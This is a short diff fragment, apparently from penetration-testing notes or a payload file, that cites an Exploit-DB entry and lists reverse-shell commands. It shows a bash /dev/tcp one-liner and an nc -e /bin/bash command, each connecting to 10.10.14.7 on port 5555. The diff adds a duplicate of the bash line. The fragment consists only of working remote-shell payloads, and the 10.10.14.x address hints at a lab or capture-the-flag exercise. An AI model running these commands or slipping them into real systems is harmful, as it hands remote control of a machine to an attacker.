@@ -32,6 +32,7 @@ https://www.exploit-db.com/exploits/50239
 
 
 bash -c 'bash -i >& /dev/tcp/10.10.14.7/5555 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.14.7/5555 0>&1'
 
 nc -nv 10.10.14.7 5555 -e /bin/bash
 
